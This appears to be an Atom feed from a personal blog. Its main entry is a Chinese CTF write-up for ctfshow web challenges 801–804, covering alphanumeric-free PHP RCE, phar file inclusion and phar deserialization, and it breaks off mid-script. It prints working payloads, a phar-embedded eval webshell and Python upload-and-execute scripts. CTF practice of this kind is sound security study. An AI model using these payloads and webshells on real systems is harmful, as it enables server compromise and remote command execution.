<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-03-06T12:25:14.560Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pdf</title>
    <link href="https://ke1nys.github.io/posts/ef0db8c.html"/>
    <id>https://ke1nys.github.io/posts/ef0db8c.html</id>
    <published>2023-03-06T12:23:44.000Z</published>
    <updated>2023-03-06T12:25:14.560Z</updated>
    
    <content type="html"><![CDATA[<p> <a href="..\..\..\文档\WeChat Files\wxid_wwo9kz0wi45d22\FileStorage\File\2023-03\PHP_task05.pdf">PHP_task05.pdf</a> </p><p> <a href="..\..\..\文档\WeChat Files\wxid_wwo9kz0wi45d22\FileStorage\File\2023-03\PHP_task_final.pdf">PHP_task_final.pdf</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; &lt;a href=&quot;..\..\..\文档\WeChat Files\wxid_wwo9kz0wi45d22\FileStorage\File\2023-03\PHP_task05.pdf&quot;&gt;PHP_task05.pdf&lt;/a&gt; &lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;..\.</summary>
      
    
    
    
    
    <category term="pdf" scheme="https://ke1nys.github.io/tags/pdf/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-常用姿势 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/66e9d03e.html"/>
    <id>https://ke1nys.github.io/posts/66e9d03e.html</id>
    <published>2023-03-03T11:49:15.000Z</published>
    <updated>2023-03-06T11:26:35.712Z</updated>
    
    <content type="html"><![CDATA[<p>这里包括多种类型的题目  为常见的姿势  用于积累自己的方法库</p><h2 id="web801-flask算pin"><a href="#web801-flask算pin" class="headerlink" title="web801(flask算pin)"></a>web801(flask算pin)</h2><p>题目</p><p><img src="../images/image-20230303200038182.png" alt="image-20230303200038182"></p><p><strong>条件: flask debug模式开启 存在任意文件读取</strong></p><p>这里的话是python版本的不同，那么计算pin码的脚本也是不相同的，原因就在于加密方式不相同。</p><p>python3.6是MD5加密，python3.8是sha1加密</p><p><a href="https://blog.csdn.net/weixin_54648419/article/details/123632203">详细的wp </a>这篇文章写的非常详细了，我这里就不写了。</p><h2 id="web802-无字母数字命令执行"><a href="#web802-无字母数字命令执行" class="headerlink" title="web802( 无字母数字命令执行)"></a>web802( <strong>无字母数字命令执行</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里话网上有很多种方法来进行这个绕过，这里就不多赘述了</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">2</span>E%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">27</span>%<span class="number">24</span>%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">27</span>%<span class="number">5</span>F%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">24</span>%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">5</span>F%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B&amp;__=system&amp;_=cat flag.php</span><br></pre></td></tr></table></figure><p><strong>这里的payload是从rce极限挑战里面拿出来的  一般情况下，rce极限挑战里的payload都可以通杀大部分题目</strong></p><h2 id="web803-phar文件包含"><a href="#web803-phar文件包含" class="headerlink" title="web803( phar文件包含)"></a>web803( <strong>phar文件包含</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题的思路：过滤了php和data，不能利用这几个协议，在文件包含中，还可以使用<strong>zip协议和phar协议(</strong>远程文件包含这个不行)</p><p><strong>file</strong>协议直接读文件，但是有个file_exists需要存在一个txt文件</p><p>而且测试了一下，只能往<strong>/tmp</strong>中去写入文件，网站目录<strong>/var/www/html</strong>写不进去的</p><p>日志包含也还是收到<strong>txt</strong>后缀的影响</p><p>所以整体的思路，先利用<strong>file_put_contents</strong>讲执行命令的语句写入到文件中，然后再通过<strong>include</strong>包含</p><p>(就是进行两次发包，第一次先把利用file_put_contents把内容写入tmp下的phar内，第二次在进行发包，进行include包含，然后进行命令执行)</p><p><strong>phar协议</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成这个phar包得先修改一下php.ini的设置</p><p><img src="../images/image-20230305155029273.png" alt="image-20230305155029273"></p><p>原本这里是On的，把他修改成Off就行</p><p>然后在重启phpstudy就行了</p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://2ed54b8f-1578-49c9-8386-ce7c9c6f68c6.challenge.ctf.show/&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;/tmp/shell.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;phar:///tmp/shell.phar/a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url=url,data=data1)</span><br><span class="line">r = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里记得得把生成的phar包，放到这个脚本所在的目录下。</p><p>phar实现文件包含原理：当与包含函数结合后，会直接执行phar中的内容，达到命令执行的效果</p><h2 id="web804-phar反序列化"><a href="#web804-phar反序列化" class="headerlink" title="web804(phar反序列化)"></a>web804(phar反序列化)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用特点：有<code>file_put_contents</code>实现文件上传的目的，将<code>phar</code>文件上传到题目服务器上，然后<code>file_exists</code>和<code>unlink</code>的影响函数，都可以触发<code>phar的反序列化</code>，从而达到反序列化中的命令执行</p><p>phar文件的生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话是先写一个反序列化链子，然后在把phar的部分拼接上去</p><p>然后上传，触发命令执行，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span 